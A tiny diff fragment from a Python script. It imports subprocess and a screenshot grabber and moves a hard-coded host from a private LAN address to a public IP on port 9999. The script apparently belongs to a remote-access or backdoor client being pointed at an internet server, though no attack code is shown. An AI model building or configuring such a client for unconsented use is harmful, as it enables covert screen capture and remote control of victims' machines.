@@ -4,7 +4,7 @@ import subprocess
 import time
 from PIL import ImageGrab
 
-host = '192.168.43.205'
+host = '3.209.239.80'
 port = 9999
 print(host)
 
